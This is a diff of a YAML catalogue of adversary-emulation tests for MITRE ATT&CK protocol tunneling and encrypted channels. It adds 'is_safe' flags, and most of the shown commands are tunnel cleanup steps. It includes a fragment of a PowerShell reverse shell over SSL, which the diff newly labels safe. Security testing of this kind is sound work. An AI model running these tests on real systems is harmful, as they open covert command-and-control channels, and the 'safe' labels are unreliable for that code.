         Remove-Item C:\%userprofile%\AppData\Local\ngrok -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Microsoft Dev tunnels (Linux/macOS)
       type: bash
       platform: linux
@@ -893,6 +987,7 @@
         PathToAtomicsFolder/../ExternalPayloads/devtunnel user logout
         rm PathToAtomicsFolder/../ExternalPayloads/devtunnel
       timeout: 60
+      is_safe: true
     - name: Microsoft Dev tunnels (Linux/macOS)
       type: bash
       platform: macos
@@ -902,6 +997,7 @@
         PathToAtomicsFolder/../ExternalPayloads/devtunnel user logout
         rm PathToAtomicsFolder/../ExternalPayloads/devtunnel
       timeout: 60
+      is_safe: true
     - name: VSCode tunnels (Linux/macOS)
       type: sh
       platform: linux
@@ -911,6 +1007,7 @@
         code tunnel unregister
         code tunnel user logout
       timeout: 60
+      is_safe: true
     - name: VSCode tunnels (Linux/macOS)
       type: sh
       platform: macos
@@ -920,6 +1017,7 @@
         code tunnel unregister
         code tunnel user logout
       timeout: 60
+      is_safe: true
     - name: Cloudflare tunnels (Linux/macOS)
       type: sh
       platform: linux
@@ -928,6 +1026,7 @@
         pkill -9 $(basename "PathToAtomicsFolder/../ExternalPayloads/cloudflared")
         rm -f "PathToAtomicsFolder/../ExternalPayloads/cloudflared"
       timeout: 60
+      is_safe: true
     - name: Cloudflare tunnels (Linux/macOS)
       type: sh
       platform: macos
@@ -936,9 +1035,10 @@
         pkill -9 $(basename "PathToAtomicsFolder/../ExternalPayloads/cloudflared")
         rm -f "PathToAtomicsFolder/../ExternalPayloads/cloudflared"
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1572
-  is_safe: false
+  is_safe: true
 - id: T1573
   name: Encrypted Channel
   description: Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.
@@ -969,6 +1069,7 @@
         $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
         $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1573
-  is_safe: false
+  is_safe: true
